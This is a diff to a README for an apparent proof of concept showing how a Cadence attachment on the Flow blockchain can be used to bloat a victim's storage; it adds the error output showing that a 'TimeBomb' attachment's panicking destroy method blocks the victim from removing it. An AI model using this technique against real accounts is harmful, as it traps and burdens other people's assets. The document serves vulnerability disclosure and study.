@@ -37,3 +37,18 @@ This is a proof of concept of an attack vector using attachments to bloat the st
     ```sh
     flow transactions send transactions/remove_and_destroy_time_bomb_fails.cdc 31 --signer victim
     ```
+
+And the panic in the `TimeBomb` attachment's `destroy` method prevents us from removing
+```
+	* transaction execute failed: [Error Code: 1101] cadence runtime error: Execution failed:
+  --> dfecd9fe22c5f797447d173275e6da8b34421baf468bfbd7bbd6006754a76582:20:8
+   |
+20 |         remove TrollAttacker.TimeBomb from attackedNFT
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+error: panic: Can't destroy, you've been trolled!!!
+  --> f8d6e0586b0a20c7.TrollAttacker:44:12
+   |
+44 |             panic("Can't destroy, you've been trolled!!!")
+   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+```
